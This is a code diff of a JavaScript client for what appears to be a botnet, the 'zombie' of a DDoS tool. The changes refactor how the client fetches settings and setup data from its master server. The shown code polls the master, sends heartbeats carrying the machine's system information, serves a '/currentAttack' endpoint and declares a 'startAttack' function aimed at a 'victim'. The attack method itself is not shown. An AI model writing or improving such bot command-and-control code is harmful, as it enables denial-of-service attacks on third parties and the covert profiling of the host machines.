@@ -75,7 +75,7 @@ let zombie = {
         maximumPortLife: null
     },
     setupdata: {
-        
+
     }
 }
 
@@ -108,38 +108,44 @@ function checkMaster(master__) {
         })
 }
 
-function fetchSettings() {
-    console.log("fetching settings.");
-    axios.get("http://" + master + "/globals")
-    .then(res => {
-            console.log("reached settings.");
+
+async function fetchSettings() {
+    return axios.get("http://" + master + "/globals")
+        .then(res => {
             zombie.config = res.data
-            console.log("placed data.");
-            console.log(zombie.config);
-            console.log(zombie.config.simpleHeartbeatDelay);
-            if (!fullyInitiated) {
-                console.log("emitted");
-                settingIntegrity.emit('true');
-            }
+            return 
         })
         .catch(err => {
             console.error(err);
         })
+}
 
-        axios.get("http://" + master + "/setup")
-        .then(res => {
-            zombie.setupdata = res.data
-            console.log(res.data)
-        })
-        .catch(err => {
-            console.error(err); 
-        })
+async function fetchSetup() {
+    return axios.get("http://" + master + "/setup")
+    .then(res => {
+        zombie.setupdata = res.data
+        return
+    })
+    .catch(err => {
+        console.error(err);
+    })
+}
+
+async function primaryFetch() {
+    console.log("pf");
+    console.log("fetching settings from " + "http://" + master + "/globals");
+    await fetchSettings()
+    console.log("fs done");
+    await fetchSetup()
+    console.log("fse done");
+    settingIntegrity.emit('true')
+
 }
 
 masterReachable.on('true', (s) => {
     master = s
     console.log('Master has been reached!', s);
-    fetchSettings()
+    primaryFetch()
 });
 
 settingIntegrity.on('true', () => {
@@ -253,7 +259,7 @@ settingIntegrity.on('true', () => {
     app.get('/currentAttack/', (req, res) => {
         res.send(200, zombie.currentAttack)
     })
-    
+
     htserver = app.listen(zombie.port.number, () => console.log(`App listening on port! ${zombie.port.number}`))
 
 
@@ -276,48 +282,47 @@ settingIntegrity.on('true', () => {
         delete zombiealt.systemInfo
         axios.patch("http://" + master + "/heartbeat", { machine: zombiealt })
             .then(res => {
-                console.log(res.data);
+                //console.log(res.data);
             })
             .catch(err => {
                 console.log(err);
             })
     }
 
-    
-    var simpleHeartbeatTimer = function() {
+
+    var simpleHeartbeatTimer = function () {
         simpleHeartbeat()
         console.log("hb");
-        console.log(zombie.config);
         setTimeout(simpleHeartbeatTimer, zombie.config.simpleHeartbeatDelay);
     }
-    
-    var complexHeartbeatTimer = function() {
+
+    var complexHeartbeatTimer = function () {
         complexHeartbeat()
         setTimeout(complexHeartbeatTimer, zombie.config.complexHeartbeatDelay);
     }
-    
-    var refreshMasterTimer = function() {
-        fetchSettings()
+
+    var refreshMasterTimer = function () {
+        primaryFetch()
         setTimeout(refreshMasterTimer, zombie.config.refreshTimerDelay);
     }
-    
-    var siDataPlacementTimer = function() {
+
+    var siDataPlacementTimer = function () {
         dynamicDataPlacement()
         setTimeout(siDataPlacementTimer, zombie.config.siDataPlacementDelay);
     }
-    
-    var detailedDynamicDataPlacementTimer = function() {
+
+    var detailedDynamicDataPlacementTimer = function () {
         detailedDynamicDataPlacement()
         setTimeout(detailedDynamicDataPlacementTimer, zombie.config.dynDataPlacementDelay);
     }
-    
+
     simpleHeartbeatTimer()
     complexHeartbeatTimer()
     refreshMasterTimer()
     siDataPlacementTimer()
     detailedDynamicDataPlacementTimer()
-    
-    function detailedDynamicDataPlacement () {
+
+    function detailedDynamicDataPlacement() {
         if (!zombie.busy && zombie.config.allDynamicData) {
             si.getDynamicData(function (data) {
                 zombie.systemInfo.dynamic.all = data
@@ -325,7 +330,7 @@ settingIntegrity.on('true', () => {
         }
     }
 
-    function staticDataPlacement () {
+    function staticDataPlacement() {
         if (!zombie.busy && zombie.config.staticData) {
             si.getStaticData(function (data) {
                 zombie.systemInfo.static = data
@@ -416,5 +421,5 @@ async function startAttack(methodData, victim, time) {
     });
 
 
-    
+
 }
